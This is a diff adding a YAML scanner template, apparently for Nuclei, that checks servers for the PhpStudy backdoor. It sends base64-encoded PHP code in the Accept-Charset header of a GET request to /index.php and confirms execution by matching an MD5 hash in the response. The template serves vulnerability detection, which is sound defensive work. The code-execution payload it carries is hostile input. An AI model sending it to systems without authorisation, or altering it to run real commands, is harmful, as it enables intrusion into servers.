@@ -1,0 +1,25 @@
+id: phpstudy-backdoor-index-detection
+info:
+  name: PhpStudy Backdoor Detection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects the presence of a backdoor in PhpStudy by sending a malicious payload in the Accept-Charset header and verifying the MD5 hash response.
+variables:
+  r: "{{rand_text_alpha(6)}}"
+  payload: "{{base64(concat('printf(md5(\'', r, '\'))'))}}"
+http:
+  - raw:
+      - |
+        GET /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Charset: {{payload}}
+        Accept-Encoding: gzip,deflate
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{md5(r)}}"
